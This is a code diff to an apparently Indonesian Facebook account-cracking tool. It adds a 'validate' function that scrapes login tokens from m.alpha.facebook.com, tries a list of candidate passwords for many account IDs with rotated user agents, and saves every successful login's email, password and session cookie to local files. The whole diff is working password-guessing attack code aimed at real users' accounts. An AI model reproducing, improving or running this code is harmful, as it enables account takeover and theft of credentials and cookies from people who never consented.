@@ -1071,10 +1071,10 @@ def passwrd():
 						pwv.append(xpwd)
 				else:pass
 					
-				if 'reguler' in method:
-					pool.submit(reguler,idf,pwv,awal)
+				if 'validate' in method:
+					pool.submit(validate,idf,pwv,awal)
 				else:
-					pool.submit(reguler,idf,pwv,awal)
+					pool.submit(validate,idf,pwv,awal)
 		print('')
 	Console().print(Panel(f'[bold green]Crack Telah Selesai,Jangan lupa Sholat Kawan',subtitle="╭───", subtitle_align="left",title=f"[bold green]Cek Opsi",width=80,style=f"{color_panel}"))
 	Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
@@ -1086,6 +1086,107 @@ def passwrd():
 		Console().print(f"[bold green]	\n[bold yellow]God Bye Kawan")
 		time.sleep(1)
 		exit()
+
+
+
+
+
+def validate(idf, pwv,awal):
+    global loop,ok,cp
+    rr = random.randint
+    ahir = str(datetime.now()-awal).split('.')[0]
+    prog.update(des,description=f"{SE}{idf} VALIDATE [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
+    prog.advance(des)
+    ua = random.choice(free)
+    ses = requests.Session()
+    try:
+        for pw in pwv:
+            pw = pw.lower()
+            with requests.Session() as r:
+                r.headers.update({
+                        'connection': 'keep-alive',
+                        'accept-language': 'id,en-US;q=0.9,en;q=0.8',
+                        'sec-fetch-mode': 'navigate',
+                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                        'sec-fetch-sest': 'document',
+                        'sec-fetch-site': 'none',
+                        'cache-control': 'max-age=0',
+                        'sec-fetch-user': '?1',
+                        'upgrade-insecure-requests': '1',
+                        'host': 'm.alpha.facebook.com',
+                        'user-agent': ua
+                    })
+                response = r.get('https://m.alpha.facebook.com/login.php?').text
+                try:
+                    jazoest = re.search('name="jazoest" value="(\d+)"', str(response)).group(1)
+                    m_ts = re.search('name="m_ts" value="(.*?)"', str(response)).group(1)
+                    li = re.search('name="li" value="(.*?)"', str(response)).group(1)
+                    fb_dtsg = re.search('{"dtsg":{"token":"(.*?)"', str(response)).group(1)
+                    lsd = re.search('name="lsd" value="(.*?)"', str(response)).group(1)
+                    __a = re.search('"encrypted":"(.*?)"', str(response)).group(1)
+                    __spin_t = re.search('"__spin_t":(\d+),', str(response)).group(1)
+                except (AttributeError) as e:
+                    Console().print("[bold hot_pink2]   ╰─>[bold red] Failed Scraping...                    ", end='\r');time.sleep(2.0);continue
+                data = {
+                        'm_ts': m_ts,
+                        'li': li,
+                        'try_number': 0,
+                        'unrecognized_tries': 0,
+                        'email': idf,
+                        'prefill_contact_point': idf,
+                        'prefill_source': 'browser_dropdown',
+                        'prefill_type': 'password',
+                        'first_prefill_source': 'browser_dropdown',
+                        'first_prefill_type': 'contact_point',
+                        'had_cp_prefilled': True,
+                        'had_password_prefilled': True,
+                        'is_smart_lock': False,
+                        'bi_xrwh': 0,
+                        'encpass': '#PWD_BROWSER:0:{}:{}'.format(__spin_t, pw),
+                        'fb_dtsg': fb_dtsg,
+                        'jazoest': jazoest,
+                        'lsd': lsd,
+                        '__dyn': '',
+                        '__csr': '',
+                        '__req': random.choice(['1','2','3','4','5']),
+                        '__a': __a,
+                        '__user': 0
+                    }
+                r.headers.update({
+                        'cookie': ("; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])),
+                        'sec-fetch-site': 'same-origin',
+                        'origin': 'https://m.alpha.facebook.com',
+                        'accept': '*/*',
+                        'content-type': 'application/x-www-form-urlencoded',
+                        'x-fb-lsd': lsd,
+                        'referer': 'https://m.alpha.facebook.com/login.php?',
+                        'content-length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ])))
+                    })
+                response2 = r.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', data = data, allow_redirects = True)
+                #open('Response.txt', 'a+').write(f'{email}|{pws}|{r.cookies.get_dict()}\n')
+                if 'c_user' in r.cookies.get_dict().keys():
+                    try:
+                        cookie = (";".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]))
+                    except:pass
+                    tree = Tree("\r[bold white]LOGIN SUCCESS                      ", style = "bold white")
+                    tree.add(f"[bold green]Email : {idf}").add(f"[bold green]Password : {pw}", style = "bold white")
+                    tree.add(f"[bold green]Cookie : {cookie}", style = "bold white")
+                    print(tree)
+                    open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
+                    break
+                elif 'checkpoint' in r.cookies.get_dict().keys():
+                    tree = Tree("\r[bold white]LOGIN CHECKPOINT                      ", style = "bold white")
+                    tree.add(f"[bold red]Email : {idf}").add(f"[bold red]Password : {pw}", style = "bold white")
+                    tree.add(f"[bold red]Useragent : {ua}", style = "bold white")
+                    print(tree)
+                    akun.append(f'{idf}|{pw}|{ua}')
+                    open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+                    break
+                else:
+                    continue
+    except requests.exceptions.ConnectionError:time.sleep(31)
+loop+=1
+
 
 
 #--------------------[ METODE reguler ]-----------------#
